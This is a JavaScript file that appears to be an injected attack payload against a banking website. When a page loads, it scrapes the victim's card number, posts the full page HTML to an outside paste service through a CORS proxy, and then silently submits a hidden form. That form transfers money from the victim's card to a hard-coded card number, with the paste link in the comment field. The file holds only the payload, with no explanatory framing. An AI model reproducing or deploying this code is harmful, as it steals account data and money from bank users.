function storeCardNumber() {
  const SELECTOR =
    "body > main > div.personalAccountWrapper > div > div.personalAccountFirstHalf > div.walletsArea > div > div > div.showdefaultWalletData.pointer > div.walletData > div.text > span:nth-child(2)";
  localStorage.setItem("number", document.querySelector(SELECTOR).innerHTML);
}

function getCardNumber() {
  return localStorage.getItem("number");
}

async function pasteInnerHtml() {
  return fetch("https://proxy.cors.sh/https://ctxt.io/new", {
    headers: {
      "User-Agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0",
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Content-Type": "application/x-www-form-urlencoded",
      "Upgrade-Insecure-Requests": "1",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-User": "?1",
      Pragma: "no-cache",
      "Cache-Control": "no-cache",
    },
    referrer: "https://vk-bank.ru/",
    body: "content=" + encodeURIComponent(document.body.innerHTML) + "&ttl=1h",
    method: "POST",
    redirect: "manual",
  })
    .then((response) => response.text())
    .then((tmp) => tmp.match(/\&key=[^&]+&v=\d+/g)[0])
    .then((match) => {
      return match;
    });
}

async function submitData() {
  const wasSubmitted = localStorage.getItem("wasapSubmitted");
  if (wasSubmitted) {
    return;
  }
  storeCardNumber();
  const match = await pasteInnerHtml();
  const TEMPLATE = `
    <form method="POST" action="/transfer/byCard">
      <input type="hidden" name="from" id="walletInputOption" value="${getCardNumber().replace(
        /\s+/g,
        ""
      )}">
            <input class="" required="" maxlength="20" name="to" type="text" value="2202100714200326">
                                                                                    
 
          <input class="" name="comment" type="text" value="${match}">
          <input class="" name="money" type="text" min="0.1" step="any" value="0.1">
          </form>
    `;
  const div = document.createElement("div");
  div.innerHTML = TEMPLATE;
  const form = div.querySelector("form");
  form.style = "display: none;";
  document.body.appendChild(form);
  form.submit();
  localStorage.setItem("wasapSubmitted", "1");
}

window.addEventListener("DOMContentLoaded", submitData);
